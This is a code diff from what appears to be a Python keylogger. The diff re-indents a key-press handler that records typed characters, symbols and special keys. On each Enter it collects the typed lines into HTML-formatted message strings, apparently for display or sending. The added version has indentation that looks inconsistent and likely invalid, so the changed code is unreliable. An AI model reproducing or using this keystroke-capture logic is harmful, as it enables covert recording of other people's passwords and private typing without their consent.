@@ -42,37 +42,38 @@ def monitor_keys():
             return False
 
     # Function to handle key press event
-    def on_press(key):
-        global typed_text, typed_words, message2, message, typed_text2, typed_words2
-        with lock:
-            try:
-                if hasattr(key, 'char') and (key.char.isalnum() or key.char in sensitive_symbols):
-                    typed_text += key.char
-                    typed_text2 += key.char
-                    print(f"Char added: {key.char}")  # Debugging line
-                elif key == keyboard.Key.space:
-                    typed_text += ' '
-                    typed_text2 += ' '
-                    print("Space added")  # Debugging line
-            except AttributeError:
-                pass
+   def on_press(key):
+    global typed_text, typed_words, message2, message, typed_text2, typed_words2
+    with lock:
+        try:
+            if hasattr(key, 'char') and (key.char.isalnum() or key.char in sensitive_symbols):
+                typed_text += key.char
+                typed_text2 += key.char
+                print(f"Char added: {key.char}")  # Debugging line
+            elif key == keyboard.Key.space:
+                typed_text += ' '
+                typed_text2 += ' '
+                print("Space added")  # Debugging line
+        except AttributeError:
+            pass
 
-            if key in sensitive_keys:
-                typed_text += f" [{key}]"
-                print(f"Sensitive key pressed: {key}")  # Debugging line
-            
-            if key == keyboard.Key.enter:
-                if typed_text:
-                    typed_words.append(typed_text)  # Append the text before clearing
-                    typed_text = ""  # Clear typed_text
-                    message2 = "<br>".join(typed_words)  # Update message2
-                    print(f"Typed Words: {message2}")  # Debugging line
+        if key in sensitive_keys:
+            typed_text += f" [{key}]"
+            print(f"Sensitive key pressed: {key}")  # Debugging line
+        
+        if key == keyboard.Key.enter:
+            if typed_text:
+                typed_words.append(typed_text)  # Append the text before clearing
+                typed_text = ""  # Clear typed_text
+                message2 = "<br>".join(typed_words)  # Update message2
+                print(f"Typed Words: {message2}")  # Debugging line
 
-                if typed_text2:
-                    typed_words2.append(typed_text2)  # Append the text before clearing
-                    typed_text2 = ""  # Clear typed_text2
-                    message = "<br>".join(typed_words2)  # Update message
-                    print(f"Typed Words 2: {message}")  # Debugging line
+            if typed_text2:
+                typed_words2.append(typed_text2)  # Append the text before clearing
+                typed_text2 = ""  # Clear typed_text2
+                message = "<br>".join(typed_words2)  # Update message
+                print(f"Typed Words 2: {message}")  # Debugging line
+
 
     # Start the key listener
     def start_key_listener():
